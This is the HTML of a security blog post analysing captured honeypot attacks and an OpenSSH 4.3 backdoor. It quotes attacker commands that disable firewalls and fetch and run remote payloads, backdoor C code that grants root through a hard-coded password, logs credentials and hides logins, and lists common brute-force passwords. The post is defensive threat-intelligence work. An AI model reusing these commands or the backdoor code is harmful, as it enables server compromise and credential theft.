@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>Openssh backdoor used on compromised Linux servers &middot; Tek</title>
+
+  
+  <link rel="stylesheet" href="https://www.randhome.io/css/poole.css">
+  <link rel="stylesheet" href="https://www.randhome.io/css/hyde.css">
+  <link rel="stylesheet" href="https://www.randhome.io/css/poole-overrides.css">
+  <link rel="stylesheet" href="https://www.randhome.io/css/hyde-overrides.css">
+  <link rel="stylesheet" href="https://www.randhome.io/css/hyde-x.css">
+  <link rel="stylesheet" href="https://www.randhome.io/css/highlight/sunburst.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.randhome.io/touch-icon-144-precomposed.png">
+  <link href="https://www.randhome.io/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="Your default page description">
+  <meta name="keywords" content="malware,openssh,backdoor,linux">
+  
+</head>
+<body class="layout-reverse">
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+      <h1><a href="https://www.randhome.io/">Te(k|ch) blog</a></h1>
+      <p class="lead">Funny security stuff</p>
+    </div>
+    <img src="/img/avatar.jpg"/>
+    <br/>
+
+    <ul class="sidebar-nav">
+      
+      <li class="sidebar-nav-item"><a href="https://www.randhome.io/privacy/">#privacy</a></li>
+      
+      <li class="sidebar-nav-item"><a href="https://www.randhome.io/references/">#references</a></li>
+      
+      <li class="sidebar-nav-item"><a href="https://www.randhome.io/about/">#whoami</a></li>
+      
+    </ul>
+
+    <br/>
+
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="https://github.com/Te-k"><i class="fa fa-github-square fa-3x"></i></a>
+      <a href="https://twitter.com/tenacioustek"><i class="fa fa-twitter-square fa-3x"></i></a>
+      
+      
+      
+      
+      
+      
+      <a href="https://www.randhome.io/index.xml" type="application/rss+xml"><i class="fa fa-rss-square fa-3x"></i></a>
+      </li>
+    </ul>
+
+    
+
+    <div class="sidebar-copyright">
+        <p>
+       <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="/media/cc.png" /></a>
+        Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+    </div>
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1 class="post-title">Openssh backdoor used on compromised Linux servers</h1>
+    <span class="post-date">Aug 1, 2016 &middot; 6 minute read
+    
+    <br/>
+    <a class="label" href="https://www.randhome.io/categories/malware">malware</a><a class="label" href="https://www.randhome.io/categories/linux">linux</a>
+    </span>
+    
+
+<p>Olà,</p>
+
+<p>Some times ago, I have installed honeypot services on one of my servers, in order to see what happens in the real outside world. I especially installed the <a href="https://github.com/cowrie/cowrie">cowrie</a> ssh honeypot which simulate a Linux shell and gather binaries that people want to install on the server (this tool is awesome, check <a href="https://github.com/micheloosterhof/cowrie/wiki/How-to-setup-Cowrie-on-Debian">here</a> to install it).</p>
+
+
+<figure >
+    
+        <img src="/media/doctor8.jpg" />
+    
+    
+</figure>
+
+
+<h2 id="cowrie-ssh">Cowrie ssh</h2>
+
+<p>This honeypot is really fun, because it records everything done during an attack, and record the whole tty session which can be replayed. If the attacker tries to download a file, cowrie automatically downloads it and stores it in a dedicated directory. In my case, I have only allowed one correct password (but an easily one : root123), so most of my logs are failed authentications:</p>
+
+<pre><code>2015-11-10 08:43:04+0100 [SSHService ssh-userauth on HoneyPotTransport,17996,177.124.226.37] login attempt [bayvit/bayvit] failed
+2015-11-10 08:44:42+0100 [SSHService ssh-userauth on HoneyPotTransport,17997,177.124.226.37] login attempt [explore/explore] failed
+2015-11-10 08:45:11+0100 [SSHService ssh-userauth on HoneyPotTransport,17998,106.186.116.239] login attempt [jonathan/111111] failed
+</code></pre>
+
+<p>Here is a short top 20 of most used users and passwords :</p>
+
+<p><strong>Top 20 users</strong></p>
+
+<ul>
+<li>root</li>
+<li>admin</li>
+<li>test</li>
+<li>user</li>
+<li>oracle</li>
+<li>postgres</li>
+<li>guest</li>
+<li>ubnt</li>
+<li>git</li>
+<li>nagios</li>
+<li>ftpuser</li>
+<li>ubuntu</li>
+<li>tomcat</li>
+<li>pi</li>
+<li>support</li>
+<li>(empty user)</li>
+<li>ftp</li>
+<li>teamspeak</li>
+<li>mysql</li>
+<li>bin</li>
+</ul>
+
+<p><strong>Top 20 passwords</strong></p>
+
+<ul>
+<li>123456</li>
+<li>password</li>
+<li>root123 (used regularly as accepted by cowrie)</li>
+<li>1234</li>
+<li>12345</li>
+<li>admin</li>
+<li>test</li>
+<li>root</li>
+<li>123</li>
+<li>(empty password)</li>
+<li>1</li>
+<li>p@ssw0rd</li>
+<li>!@</li>
+<li>wubao</li>
+<li>jiamima</li>
+<li>!q@w</li>
+<li>!</li>
+<li>!qaz@wsx</li>
+<li>qwerty</li>
+<li>user</li>
+</ul>
+
+<p>Successfull attacks often juste download a malicious script/binary and execute it:</p>
+
+<pre><code>HoneyPotTransport,110774,121.12.173.62] CMD: /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://222.186.56.5:88/China1991;chmod 755 China1991;./China1991;
+</code></pre>
+
+<h2 id="what-are-those-files">What are those files?!?</h2>
+
+<p>Among the files downloaded by Cowrie, I noticed an important number of text files, which is weird as I was thinking of finding only perl scripts / malicious ELF files. I finally found the logs related to these files:</p>
+
+<pre><code>2016-01-21 19:37:19+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] login attempt [root/root123] succeeded
+2016-01-21 19:37:20+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] root authenticated with keyboard-interactive
+2016-01-21 19:37:20+0100 [SSHService ssh-userauth on HoneyPotTransport,111016,37.228.227.119] starting service ssh-connection
+2016-01-21 19:37:20+0100 [SSHService ssh-connection on HoneyPotTransport,111016, 37.228.227.119] got channel session request
+2016-01-21 19:37:20+0100 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,111016,37.228.227.119] channel open
+2016-01-21 19:37:20+0100 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,111016,37.228.227.119] pty request: xterm (24, 80, 0, 0)
+[SNIP]
+</code></pre>
+
+<p>The cowrie log is pretty long because&hellip; it was a manual attack (whut?). So you have many failed commands (cowrie doesn&rsquo;t implement all the shell commands), and in the end the interesting one:</p>
+
+<pre><code>unset HISTFILE
+unset HISTSAVE
+unset SAVEFILE
+unset ********
+history -n
+unset WATCH
+export HISTFILE=/dev/null
+w
+sshd
+uname -a
+ps x
+cat /etc/hosts
+/sbin/ifconfig -a |grep inet | wc -l
+ls -la
+wget http://fm.fo/images/cette.jpg; tar zxvf cette.jpg; rm -rf cette*; cd ssh
+ls -la
+cd ..
+rm -rf ssh
+</code></pre>
+
+<p>Here the attacker doesn&rsquo;t understand what is happening because cowrie simulates the wget commands but the tar command fails (likely a cowrie bug when implementing the command). So the attacker will try many different ways to untar the file, and finally reboot the server.</p>
+
+<p>Once extracted, the archive is composed of the source code of openssh 4.3 (I have uploaded all the code on <a href="https://github.com/Te-k/openssh-backdoor">github</a> if you want to check by yourself)</p>
+
+<pre><code class="language-bash">&gt; cat v
+OpenSSH_4.3p2, OpenSSL 0.9.8b 04 May 2006
+</code></pre>
+
+<p>There is still one weird thing : what is this <em>backdoor.h</em> file ?</p>
+
+<pre><code class="language-C">/* backdoor stuff */
+#define BACKDOORPASSWD &quot;SSHD_PASS&quot;
+#define LOGGING_PASSWORDS 1
+#define PASSWORDS_LOG_FILE &quot;LOG_PATH&quot;
+
+int backdoor_active;
+</code></pre>
+
+<p>The BACKDOORPASSWD macro is used in the file <em>auth-passwd.c</em>, in the auth_password function in charge of checking the users password:</p>
+
+<pre><code class="language-C">    backdoor_active = 0;
+    if(strcmp(password, BACKDOORPASSWD) == 0)
+    {
+        backdoor_active = 1;
+        return 1;
+    }
+    else
+    {
+    [LEGITIMATE CODE]
+    [...]
+</code></pre>
+
+<p>Strangely, this backdoor also implements a logging functionnality both in <em>sshconnect1.c</em> and <em>sshconnect2.c</em>:</p>
+
+<pre><code class="language-C">    if((strcmp(BACKDOORPASSWD,password) != 0) &amp;&amp; LOGGING_PASSWORDS)
+      {
+        FILE *fp = fopen(PASSWORDS_LOG_FILE,&quot;a&quot;);
+        fprintf (fp,&quot;+host: %s +user: %s +password: %s\n&quot;, get_remote_ipaddr(), options.user, password);
+        fclose (fp)
+      }
+</code></pre>
+
+<p>In <em>session.c</em>, the backdoor disable the hist file and force the suid to 0 (root):</p>
+
+<pre><code class="language-C">     if(backdoor_active)
+        child_set_env(&amp;env, &amp;envsize, &quot;HISTFILE&quot;, &quot;/dev/null&quot;);
+
+    [...]
+
+    if(!backdoor_active)
+      {
+        [SNIP]
+      }
+    else
+      {
+        setgid(0);
+        initgroups(pw-&gt;pw_name, 0);
+      }
+
+    [...]
+    if(!backdoor_active)
+        permanently_set_uid(pw);
+</code></pre>
+
+<p>And finally in <em>sshlogin.c</em>, it disable logging of connections using the backdoor password:</p>
+
+<pre><code class="language-C">/*
+* Records that the user has logged in.  I these parts of operating systems
+* were more standardized.
+*/
+void
+record_login(pid_t pid, const char *ttyname, const char *user, uid_t uid,
+    const char *host, struct sockaddr * addr, socklen_t addrlen)
+{
+  if(!backdoor_active)
+      {
+        struct logininfo *li;
+
+        li = login_alloc_entry(pid, user, host, ttyname);
+        login_set_addr(li, addr, addrlen);
+        login_login(li);
+        login_free_entry(li);
+      }
+    }
+}
+#ifdef LOGIN_NEEDS_UTMPX
+void
+record_utmp_only(pid_t pid, const char *ttyname, const char *user,
+                 const char *host, struct sockaddr * addr, socklen_t addrlen)
+{
+  if(!backdoor_active)
+    {
+  struct logininfo *li;
+
+  li = login_alloc_entry(pid, user, host, ttyname);
+  login_set_addr(li, addr, addrlen);
+  login_utmp_only(li);
+  login_free_entry(li);
+}}
+#endif
+
+/* Records that the user has logged out. */
+void
+record_logout(pid_t pid, const char *ttyname, const char *user)
+{
+  if(!backdoor_active)
+    {
+  struct logininfo *li;
+
+  li = login_alloc_entry(pid, user, NULL, ttyname);
+  login_logout(li);
+  login_free_entry(li);
+}
+}
+
+</code></pre>
+
+<p>All these modifications are in the <a href="https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch">openssh-3.6.1p2-backdoor.patch</a> included in the code.</p>
+
+<h2 id="lets-do-threat-intelligence">Lets do Threat Intelligence</h2>
+
+<p>So let&rsquo;s try to understand what happened : a successful authentication happened the 21/01/16 from 37.228.227.119 (weirdly from source port 34, the client is putty). The first connection is directly successful (no bruteforce before).</p>
+
+<p>This IP address belongs to UPC Ireland, which seems to be a Telecom provider now called Virgin media (I informed them of this attack on their abuse email address).</p>
+
+<p>I have learnt recently that the <a href="https://www.dshield.org/">SANS Dshield Group</a> collects SSH logs from kippo/cowrie ssh honeypots. You can easily send your cowrie log by using the cowrie dshield output plugin (there is also a script called <a href="https://github.com/jkakavas/kippo-pyshield">kippo-pyshield</a> to do this).</p>
+
+<p>Let&rsquo;s check what we can learn about the IP from the <a href="https://dshield.org/api/">Dshield API</a>, you just have to visit <a href="https://isc.sans.edu/api/ip/37.228.227.119">https://isc.sans.edu/api/ip/37.228.227.119</a> (?json or ?text can be added to change the format):</p>
+
+<pre><code>&lt;ip&gt;
+    &lt;number&gt;37.228.227.119&lt;/number&gt;
+    &lt;count/&gt;
+    &lt;attacks/&gt;
+    &lt;maxdate/&gt;
+    &lt;mindate/&gt;
+    &lt;updated/&gt;
+    &lt;comment/&gt;
+    &lt;maxrisk/&gt;
+    &lt;asabusecontact&gt;noc@libertyglobal.com&lt;/asabusecontact&gt;
+    &lt;as&gt;6830&lt;/as&gt;
+    &lt;asname&gt;
+	&lt;![CDATA[
+	    LGI-UPC formerly known as UPC Broadband Holding B.V.,
+	]]&gt;
+    &lt;/asname&gt;
+    &lt;ascountry&gt;AT&lt;/ascountry&gt;
+    &lt;assize&gt;8576685&lt;/assize&gt;
+    &lt;network&gt;37.228.224.0/19&lt;/network&gt;
+&lt;/ip&gt;
+</code></pre>
+
+<p>So Dshield knows nothing about this address, which was likely not used for any ssh bruteforce attack.  My best guess is that automated tools were used to bruteforce the server and find the password (hard to find which one). Once identified, the user connected to the server using his local computer (putty under Windows) and from his own ISP (and this is pretty stupid thing to do).</p>
+
+<p>The malicious code is hosted on the domain fm.fo (hxxp://fm/fo/images/cette.jpg exactly) which host a website of an icelandinc cleaning company (if I guess well, icelandic is really badly translated by Google). This website was likely compromised to host the malicious code but it is weird because it doesn&rsquo;t use any common framework (I contacted the owner, no answer yet).</p>
+
+<h2 id="iocs">IOCs</h2>
+
+<p>It&rsquo;s not the new super-duper fancy APT group attack, but I like how <a href="https://twitter.com/malware_traffic">Brad</a> ends <a href="http://www.malware-traffic-analysis.net/">his posts</a> with a summary of what to check on your system, so here is a short summary:</p>
+
+<ul>
+<li>Bruteforce IP : 37.228.227.119</li>
+<li>URL of the malicious code : hxxp://fm.fo/images/cette.jpg (still available when writing the article, IP resolved is 77.243.43.9 in Denmark)</li>
+<li>SSH backdoor password : SSHD_PASS</li>
+<li>File created by the backdoor : LOG_PATH</li>
+</ul>
+
+<p>I&rsquo;m still on <a href="https://twitter.com/tenacioustek">Twitter</a> if you have any comment.</p>
+
+<p>Ciao</p>
+
+  </div>
+  
+</div>
+
+
+
+
+<script src="https://www.randhome.io/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
+
